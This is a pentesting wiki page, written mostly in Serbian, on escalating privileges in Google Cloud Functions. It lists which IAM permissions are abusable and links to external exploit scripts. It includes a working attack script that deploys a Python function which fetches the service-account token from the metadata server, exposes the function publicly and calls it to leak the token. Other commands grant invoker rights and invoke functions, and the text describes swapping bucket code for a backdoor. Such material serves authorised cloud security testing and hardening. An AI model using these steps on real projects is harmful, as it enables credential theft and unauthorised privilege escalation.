# GCP - Cloudfunctions Privesc

{{#include ../../../banners/hacktricks-training.md}}

## cloudfunctions

Više informacija o Cloud Functions:

{{#ref}}
../gcp-services/gcp-cloud-functions-enum.md
{{#endref}}

### `cloudfunctions.functions.create` , `cloudfunctions.functions.sourceCodeSet`_,_ `iam.serviceAccounts.actAs`

Napadač sa ovim privilegijama može **kreirati novu Cloud Function sa proizvoljnim (zlonamernim) kodom i dodeliti joj Service Account**. Zatim, leak the Service Account token from the metadata to escalate privileges to it.\
Moguće su potrebne neke privilegije za pokretanje funkcije.

Exploit scripts for this method can be found [here](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudfunctions.functions.create-call.py) and [here](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudfunctions.functions.create-setIamPolicy.py) and the prebuilt .zip file can be found [here](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/tree/master/ExploitScripts/CloudFunctions).

### `cloudfunctions.functions.update` , `cloudfunctions.functions.sourceCodeSet`_,_ `iam.serviceAccounts.actAs`

Napadač sa ovim privilegijama može **izmeniti kod Function i čak izmeniti prikačeni Service Account** sa ciljem exfiltrating the token.

> [!CAUTION]
> In order to deploy cloud functions you will also need actAs permissions over the default compute service account or over the service account that is used to build the image.

Neke dodatne privilegije kao `.call` permission za version 1 cloudfunctions ili uloga `role/run.invoker` za trigger funkcije mogu biti potrebne.
```bash
# Create new code
temp_dir=$(mktemp -d)

cat > $temp_dir/main.py <<EOF
import subprocess

def main(request):
cmd = "curl -s -f -H 'Metadata-Flavor: Google' 'http://metadata/computeMetadata/v1/instance/service-accounts/default/token'"
result = subprocess.check_output(cmd, shell=True, text=True)
return result
EOF

echo "" > $temp_dir/requirements.txt

zip -r $temp_dir/function.zip $temp_dir/main.py $temp_dir/requirements.txt

# Update code
gcloud functions deploy <cloudfunction-name> \
--runtime python312 \
--source $temp_dir \
--entry-point main \
--service-account <sa>@$PROJECT_ID.iam.gserviceaccount.com \
--trigger-http \
--allow-unauthenticated

# Get SA token calling the new function code
gcloud functions call <cloudfunction-name>
```
> [!CAUTION]
> Ako dobijete grešku `Permission 'run.services.setIamPolicy' denied on resource...` to je zato što koristite parametar `--allow-unauthenticated` i nemate dovoljno dozvola za to.

The exploit script for this method can be found [here](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudfunctions.functions.update.py).

### `cloudfunctions.functions.sourceCodeSet`

Sa ovom dozvolom možete dobiti **signed URL koji omogućava otpremanje fajla u bucket funkcije (ali kod funkcije neće biti izmenjen, i dalje ga morate ažurirati)**
```bash
# Generate the URL
curl -X POST https://cloudfunctions.googleapis.com/v2/projects/{project-id}/locations/{location}/functions:generateUploadUrl \
-H "Authorization: Bearer $(gcloud auth application-default print-access-token)" \
-H "Content-Type: application/json" \
-d '{}'
```
Nisam baš siguran koliko je korisna samo ova dozvola iz perspektive napadača, ali dobro je znati.

### `cloudfunctions.functions.setIamPolicy` , `iam.serviceAccounts.actAs`

Dodeli sebi bilo koju od prethodnih **`.update`** ili **`.create`** privilegija da eskaliraš.
```bash
gcloud functions add-iam-policy-binding <NOMBRE_FUNCION> \
--region=<REGION> \
--member="<MIEMBRO>" \
--role="roles/cloudfunctions.invoker"
```
### `cloudfunctions.functions.update`

Ako imate samo **`cloudfunctions`** dozvole, bez **`iam.serviceAccounts.actAs`**, nećete moći da ažurirate funkciju — tako da ovo NIJE VALIDAN PRIVESC.

### Pozivanje funkcija
Sa `cloudfunctions.functions.get`, `cloudfunctions.functions.invoke`, `run.jobs.run`, i run.routes.invoke dozvolama, identitet može direktno da pozove Cloud Functions. Takođe je neophodno da funkcija dozvoli javni pristup, ili da pozivaoc bude u istoj mreži kao i sama funkcija.
```bash
curl -X POST "https://<FUNCTION_URL>" \
-H "Authorization: bearer $(gcloud auth print-identity-token)" \
-H "Content-Type: application/json" \
-d '{  "name": "Developer" }'
```
### Pristup za čitanje i pisanje nad bucket

Ako imate pristup za čitanje i pisanje nad bucket-om, možete pratiti promene u kodu i kad god se desi **ažuriranje u bucket-u možete zameniti novi kod svojim kodom** tako da nova verzija Cloud Function bude pokrenuta sa poslatim backdoored code-om.

You can check more about the attack in:

{{#ref}}
gcp-storage-privesc.md
{{#endref}}

Međutim, ne možete ovo iskoristiti za pre-kompromitovanje Cloud Functions trećih strana zato što, ako kreirate bucket u svom nalogu i date mu javna prava da eksterni projekat može pisati u njega, dobijate sledeću grešku:

<figure><img src="../../../images/image (1) (1) (1).png" alt="" width="304"><figcaption></figcaption></figure>

> [!CAUTION]
> Međutim, ovo bi moglo biti iskorišćeno za DoS napade.

### Pristup za čitanje i pisanje nad Artifact Registry

Kada se kreira Cloud Function, nova docker image se push-uje u Artifact Registry projekta. Pokušao sam da izmenim image novim, pa čak i da obrišem trenutni image (i `cache` image) i ništa se nije promenilo — Cloud Function je nastavila da radi. Dakle, možda **bi moglo biti moguće zloupotrebiti Race Condition attack** kao kod bucket-a da se promeni docker container koji će biti pokrenut, ali **samo izmena smeštenog image-a nije moguća da kompromituje Cloud Function**.

## Referencije

- [https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/)

{{#include ../../../banners/hacktricks-training.md}}
